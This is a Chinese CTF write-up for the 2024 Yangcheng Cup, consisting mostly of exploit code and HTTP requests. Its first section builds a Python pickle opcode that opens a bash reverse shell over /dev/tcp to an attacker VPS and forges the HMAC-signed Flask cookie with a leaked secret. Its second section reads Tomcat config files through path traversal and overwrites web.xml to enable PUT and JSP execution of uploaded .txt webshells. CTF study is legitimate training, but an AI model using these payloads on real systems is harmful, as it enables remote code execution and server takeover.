---
title: 2024 年"羊城杯"粤港澳大湾区网络安全大赛 Writeup
contest: 羊城杯
year: 2024
difficulty: hard
vuln_type: [web_unknown, deserialize, lfi, file_read, file_upload, xxe, ssti, crypto_unknown]
tags: [Flask pickle 反序列化 cookie, cookie_check 逻辑缺陷, hmac-md5 签名, bottle template pickle, Tomcat conf 覆盖, web.xml PUT/DELETE, base64-steghide, AI prompt injection]
attack_chain: 1. Lyrics For You: /lyrics 路径穿越读源码 / 2. /board pickle 反序列化 → 构造 cos.system opcode → MD5 签名伪造 cookie / 3. tomtom2: /myapp/read 任意读 tomcat-users.xml → 覆盖 web.xml 启用 PUT + .txt→jsp 映射 → 上传 jsp 马
key_payload: opcode=b'(cos\nsystem\nS'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'\no.' ; secret="EnjoyThePlayTime123456" ; cookie = cookie_encode(('user', opcode), secret) ; PUT /myapp/upload?path=../../../../opt/tomcat/conf 上传 web.xml
one_liner: Flask pickle cookie + Tomcat conf 覆盖 PUT 上传 jsp。
lesson: Tomcat conf/web.xml 覆盖 + PUT 启用 readonly=false 即可上传 .txt 当 jsp 解析。
quality: high
---
# 2024 年"羊城杯"粤港澳大湾区网络安全大赛 Writeup

## 1. Lyrics For You（Flask pickle 反序列化）

```python
# /lyrics 路径：os.path.join(os.getcwd()+"/lyrics", query)
# 路径穿越读源码

# cookie.py: set_cookie/get_cookie 用 hmac-md5 签名 + base64 pickle
# blacklist: [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
# 但 secret = "EnjoyThePlayTime123456" 已知
```

```python
opcode = b'''(cos
system
S'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'
o.'''

secret = "EnjoyThePlayTime123456"
exp = touni(cookie_encode(('user', opcode), secret))
print(exp)
# !<hmac_sig>?<base64_pickle>
```

**关键**：
- `cos` 是 Python pickle 协议 0 的 GLOBAL opcode
- `S'...'` 是 STRING opcode
- `(o.` 是 MARK + REDUCE 触发 system
- blacklist 检测 `data.lower()` 但 pickle opcode 字节流能过
- cookie_check 用 hmac-md5 → 用 secret 重新签名绕过

## 2. tomtom2（Tomcat conf 覆盖 + PUT 上传 jsp）

```http
# 1. 读 tomcat-users.xml
GET /myapp/read?filename=conf%2Ftomcat-users.xml

# 2. 覆盖 web.xml 启用 PUT 和 .txt→jsp 映射
POST /myapp/upload?path=../../../../opt/tomcat/conf
Content-Type: multipart/form-data; boundary=...
------xxx
Content-Disposition: form-data; name="file"; filename="web.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<web-app>
  <servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
      <param-name>debug</param-name><param-value>0</param-value>
    </init-param>
    <init-param>
      <param-name>listings</param-name><param-value>false</param-value>
    </init-param>
    <!-- 允许 PUT 和 DELETE -->
    <init-param>
      <param-name>readonly</param-name><param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
  <servlet-mapping>
    <servlet-name>default</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>
  <servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
    <load-on-startup>3</load-on-startup>
  </servlet>
  <servlet-mapping>
    <servlet-name>jsp</servlet-name>
    <url-pattern>*.txt</url-pattern>
  </servlet-mapping>
</web-app>
------xxx--

# 3. 上传 .txt 木马 → 按 *.txt→jsp 映射执行
```

## 3. AI prompt injection（Web2）

base64 隐写 + steghide 提 flag。

## 4. misc / crypto 其他

- AES/SM4 + LFSR 弱密钥爆破
- 倒序 base64 隐写
